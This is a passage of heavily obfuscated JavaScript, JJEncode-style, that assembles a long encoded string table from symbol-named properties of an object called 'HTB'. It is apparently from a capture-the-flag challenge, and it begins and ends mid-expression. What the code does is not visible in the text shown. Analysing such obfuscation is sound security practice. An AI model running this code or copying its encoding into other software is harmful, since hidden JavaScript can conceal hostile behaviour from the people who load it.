$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.__$+HTB.$$__+HTB._$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$__+HTB.$$$+HTB._$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+HTB.$$$$+HTB.$$_+HTB._$_+HTB._$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB._$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$_+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$__$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+HTB.$$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB._$_+HTB.$__$+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB.$$_+HTB.__$+HTB.$__+HTB.$__+"|\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"|"+HTB.$_$_+HTB.$$$_+HTB._$$+HTB.$$$_+HTB._$$+HTB.$$_$+HTB.$$_$+HTB.$$$+HTB.$___+HTB.$__+HTB._$$+HTB.$___+HTB.$$_+HTB._$_+HTB.$$_+HTB.$$_$+HTB.$__+HTB._$$+HTB.$$__+HTB.$_$_+HTB.$$$_+HTB.$$$$+HTB.$__+HTB.$$_+HTB.__$+HTB.$$_$+HTB.$___+HTB._$$+HTB.$$$+HTB.$$_$+HTB.$$$$+HTB.$__+"|"+HTB.$$_$+HTB.$$$_+HTB.$$__+HTB._$+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$_$+HTB.$__$+HTB.$$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.___+HTB.__+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.__$+HTB.$$_$+HTB.$$_+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$__+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.$$_$+HTB.$_$+HTB.$$$+HTB.$_$_+HTB.$$_$+HTB.___+HTB.$__$+HTB.$_$$+HTB.$$_$+HTB.___+HTB._$_+HTB.___+HTB.$___+HTB.$_$+HTB.___+HTB.__$+HTB.$$$_+HTB._$_+HTB.$___+HTB.___+HTB.$___+HTB.$_$_+HTB.$$$$+HTB.$_$_+HTB.$$_+HTB.$__+HTB.$$$_+HTB.$_$+HTB.$_$+HTB.$_$_+HTB.$$$$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.__$+HTB.$_$$+HTB.$_$+HTB.$$_+HTB.$_$_+"|"+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$$_$+HTB.$__$+HTB.$___+HTB.$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$_$+"|"+HTB.$$$$+HTB.$__$+HTB.___+HTB.$$_+HTB.__$+HTB.$$$$+HTB.$$$+HTB.$$__+HTB.___+HTB.$$$$+HTB.$$$_+HTB.$$$+HTB._$$+HTB.$$__+HTB.___+HTB.$$$$+HTB.___+HTB.$_$_+HTB.$__$+HTB.$$_$+HTB._$$+HTB.__$+HTB.___+HTB._$_+HTB.$_$+HTB.__$+HTB.$_$_+HTB.___+HTB.$$$$+HTB._$$+HTB.$_$$+HTB._$_+"|"+HTB.$$$$+HTB.$__+HTB.$$_$+HTB.$$$$+HTB._$_+HTB.__$+HTB.$$__+HTB.$$__+HTB.$$__+HTB.$_$_+HTB.___+HTB.$$$+HTB._$_+HTB.$_$$+HTB.$_$_+HTB.$_$+HTB.$$$_+HTB.___+HTB.___+HTB._$$+HTB.$$$_+HTB._$_+HTB.$$_+HTB.$_$+HTB.$$$_+HTB.$__+HTB._$$+HTB.__$+HTB.$__+HTB.$_$_+HTB.$_$_+HTB.$__+"|"+HTB.$_$_+HTB.$__+HTB.$_$_+HTB.$__$+HTB._$_+HTB.$$_+HTB.$$$+HTB.___+HTB.___+HTB.$$_$+HTB.$$$_+HTB.$__$+HTB.___+HTB.$$$+HTB.$_$+HTB.___+HTB.$$$$+HTB._$$+HTB.$___+HTB.$$_$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$__+HTB.$__+HTB.$_$$+HTB.$$$$+HTB.___+HTB.$$_$+HTB.$$_+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$__$+HTB.$_$$+HTB.$$$_+HTB._$_+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$$_$+HTB.__$+HTB.$$$_+HTB.___+HTB.$$__+HTB.$_$$+HTB.___+HTB.$___+HTB.$_$_+HTB.$__$+HTB.___+HTB.$__$+HTB.$$_+HTB.$_$+HTB.$_$_+HTB.$$$+HTB.$__+HTB.$___+HTB.$__$+HTB.$_$_+HTB.$_$_+HTB.$_$$+HTB.$$__+HTB.$_$+HTB.$$$$+HTB.$$_+HTB.$$_$+HTB.$__+HTB._$_+HTB._$$+HTB.$$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$$_$+HTB.$_$$+HTB.$$$_+HTB.$__+"|\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.$$__+HTB._$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$_+HTB.___+HTB.$$__+HTB.$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+HTB.$$$+HTB.$$$$+HTB.$_$$+HTB._$_+"|"+HTB.$$$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$_$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$_+HTB.$__$+HTB.$_$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+HTB.$__+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$___+HTB.$$$$+HTB.$$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$$$_+HTB.$$$_+HTB.$$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$_$$+HTB.$$$$+HTB.$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB.$$$$+HTB.___+HTB.$$$_+HTB.$_$$+"|\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$_+"|"+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$_$+HTB.$__$+"|"+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$___+HTB.$__+HTB.___+HTB.$_$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+"|\\"+HTB.__$+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+HTB.$$_+HTB.$$__+HTB.$__+HTB.$$$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$$$+HTB.$_$$+HTB.$_$$+HTB.$_$+"|"+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+HTB.$_$_+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$__+HTB.$_$+HTB.$$__+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+HTB.$$__+"|"+HTB.__$+HTB._$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$___+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$_+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.$_$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$__+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.$$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$__$+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$__+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$__+HTB.$__+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+HTB._$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+HTB.__+"|"+HTB.$_$_+HTB.$_$$+HTB.$$__+HTB.$$_$+HTB.$$$_+HTB.$$$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB.___+HTB.__$+HTB._$_+HTB._$$+HTB.$__+HTB.$_$+HTB.$$_+HTB.$$$+HTB.$___+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+HTB.$_$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB._$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB._$$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB._$$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB.__$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__+HTB.$$$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$$+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB._+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB.__+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|"+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$___+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.___+"|"+HTB._$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$_$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB._+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB._$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB._$+HTB.$$$$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$_+"|"+HTB.__+HTB.$$_$+(![]+"")[HTB._$_]+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+HTB.$_$_+"|"+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB.___+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB._+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$_+